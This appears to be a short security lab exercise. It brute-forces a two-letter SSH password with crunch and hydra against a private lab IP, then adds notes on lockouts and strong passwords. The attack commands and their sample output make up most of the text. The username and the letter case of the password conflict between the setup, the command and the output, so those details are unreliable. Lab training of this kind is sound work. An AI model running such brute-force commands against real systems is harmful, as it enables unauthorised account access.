# Online SSH password attack with Hydra

## Password attacks. Techniques - Online password attacks

We have a hydra user who has a 2-character password (letters) to access the SSH service on the KALI machine.

Guess the password with hydra.

Goal is to use Hydra to brute-force a short SSH password

## Example commands
Assuming the target service is SSH on Kali (KALI_IP=192.168.0.1)

Username: test
Password: exactly 2 smallcase letters

### 1. Create a 2-letter wordlist

Use crunch:
```bash
crunch 2 2 qwertyuiopasdfghjklzxcvbnm > letterpass.txt
```

### 2. Run Hydra and measure time

```bash
time hydra -l hydra -P letterpass.txt ssh://192.168.0.1
``` 

Hydra output will indicate something like if it is sussefull:

```output
[22][ssh] host: 192.168.0.1   login: test   password: OI
```

## Analysis/Notes:

Even a very small keyspace is trivial to brute-force online when no rate limiting or/and lockout is present.

In real environments, online attacks risk IP bans or account lockouts .

Use long, complex passwords and account lockouts throttling to make this type of attack impractical.